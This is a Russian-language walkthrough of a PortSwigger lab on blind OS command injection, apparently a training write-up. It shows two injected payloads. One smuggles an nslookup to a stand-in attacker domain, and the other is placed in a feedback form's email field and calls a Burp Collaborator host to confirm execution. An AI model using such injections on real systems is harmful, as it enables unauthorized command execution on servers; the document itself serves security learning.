# Blind OS command injection with out-of-band interaction

## Theory

Можно использовать введенную команду, которая инициирует внешнее сетевое взаимодействие с системой, которой вы управляете, используя методы OAST. Например:
```
& nslookup kgji2ohoyw.web-attacker.com &
```

Эта полезная нагрузка использует команду nslookup для поиска DNS для указанного домена. Злоумышленник может отслеживать выполнение указанного поиска и, таким образом, обнаруживать, что команда была успешно внедрена.

## Writeup

Главная страница:

![](https://github.com/fobblified/Writeups/blob/main/Portswigger/Command_injection/Blind_OS_command_injection_with_out-of-band_interaction/assets/1.png)

Перейдем на страницу "Submit feedback".

![](https://github.com/fobblified/Writeups/blob/main/Portswigger/Command_injection/Blind_OS_command_injection_with_out-of-band_interaction/assets/2.png)

Заполним поля для ввода случайными данными и перехватим запрос.

![](https://github.com/fobblified/Writeups/blob/main/Portswigger/Command_injection/Blind_OS_command_injection_with_out-of-band_interaction/assets/3.png)

Откроем Burp Collaborator.

![](https://github.com/fobblified/Writeups/blob/main/Portswigger/Command_injection/Blind_OS_command_injection_with_out-of-band_interaction/assets/4.png)

Скопируем DNS кнопкой "Copy to clipboard" и модифицируем запрос.
```
email=111%40gmail.com||nslookup+uwulv3j5g76lsugm3828tvxxuo0eo3.burpcollaborator.net||
```

![](https://github.com/fobblified/Writeups/blob/main/Portswigger/Command_injection/Blind_OS_command_injection_with_out-of-band_interaction/assets/5.png)

Отправив запрос, перейдем к окну Burp Collaborator и нажмем кнопку "Pull now" для обновления. Заметим, что мы получили ответ от нашего модифицированного запроса.

![](https://github.com/fobblified/Writeups/blob/main/Portswigger/Command_injection/Blind_OS_command_injection_with_out-of-band_interaction/assets/6.png)

Получаем ответ от сервера.

![](https://github.com/fobblified/Writeups/blob/main/Portswigger/Command_injection/Blind_OS_command_injection_with_out-of-band_interaction/assets/7.png)
